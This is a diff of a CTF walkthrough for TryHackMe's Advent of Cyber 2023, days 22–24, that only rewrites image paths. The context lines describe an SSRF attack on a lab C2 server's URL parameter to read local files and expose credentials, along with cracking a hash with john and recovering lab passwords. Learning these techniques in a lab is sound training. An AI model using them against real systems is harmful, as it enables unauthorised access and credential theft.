 ## Day 22 - Jingle Your SSRF Bells: A Merry Command & Control Hackventure
 
@@ -1658,11 +1658,11 @@ We first need to identify the vulnerable input which can be manipulated to trigg
 
 Visiting the C2 domain, we see that it is protected with a login form. 
 
-![Advent of Cyber 2023 Day 22 - Login Form](/images/aoc2023d22_login_form.png)
+![Advent of Cyber 2023 Day 22 - Login Form](tryhackme/images/aoc2023d22_login_form.png)
 
 The C2 can also be accessed via an API. The `Accessing through API` redirects us to the API endpoint where we can craft some SSRF attacks:
 
-![Advent of Cyber 2023 Day 22 - API Endpoint](/images/aoc2023d22_api_endpoint.png)
+![Advent of Cyber 2023 Day 22 - API Endpoint](tryhackme/images/aoc2023d22_api_endpoint.png)
 
 From the documentation, we can see that the `http://10.10.48.88/getClientData.php?url=http://IP_OF_CLIENT/NAME_OF_FILE_YOU_WANT_TO_ACCESS` endpoint takes a URL as a parameter. However, if we change the parameter to access a file on the C2, it will fetch its contents, such as `index.php`:
 
@@ -1680,13 +1680,13 @@ $password = "mcgreedy!@#$%";
 ?>
 ```
 
-![Advent of Cyber 2023 Day 22 - C2 Panel](/images/aoc2023d22_c2_panel.png)
+![Advent of Cyber 2023 Day 22 - C2 Panel](tryhackme/images/aoc2023d22_c2_panel.png)
 
 From here, we can remove the compromised hosts from the panel:
 
-![Advent of Cyber 2023 Day 22 - Remove Agent](/images/aoc2023d22_remove_agent.png)
+![Advent of Cyber 2023 Day 22 - Remove Agent](tryhackme/images/aoc2023d22_remove_agent.png)
 
-![Advent of Cyber 2023 Day 22 - Flag](/images/aoc2023d22_flag.png)
+![Advent of Cyber 2023 Day 22 - Flag](tryhackme/images/aoc2023d22_flag.png)
 
 ## Day 23 - Relay All the Way
 
@@ -1725,7 +1725,7 @@ $ john --wordlist=greedykeys.txt hash.txt
 
 This reveals the password as `GreedyGrabber1@`, allowing us to get the flag when we authenticate via RDP:
 
-![Advent of Cyber 2023 Day 23 - Flag](/images/aoc2023d23_flag.png)
+![Advent of Cyber 2023 Day 23 - Flag](tryhackme/images/aoc2023d23_flag.png)
 
 ## Day 24 - You Are on the Naughty List, McGreedy
 
@@ -1735,12 +1735,12 @@ Using the captured image, we can being to analyse the contents of the device.
 
 We see an image was captured of a board containing a flag:
 
-![Advent of Cyber 2023 Day 24 - Image Flag](/images/aoc2023d24_image_flag.png)
+![Advent of Cyber 2023 Day 24 - Image Flag](tryhackme/images/aoc2023d24_image_flag.png)
 
 Interestingly, we also see McGreedy has saved Detective Frost-eau as "Detective Carrot-Nose" on the device:
 
-![Advent of Cyber 2023 Day 24 - Carrot-Nose](/images/aoc2023d24_carrot_nose.png)
+![Advent of Cyber 2023 Day 24 - Carrot-Nose](tryhackme/images/aoc2023d24_carrot_nose.png)
 
 Finally, we see a password was shared to Van Sprinkles via SMS:
 
-![Advent of Cyber 2023 Day 24 - SMS Password](/images/aoc2023d24_sms_password.png)
+![Advent of Cyber 2023 Day 24 - SMS Password](tryhackme/images/aoc2023d24_sms_password.png)
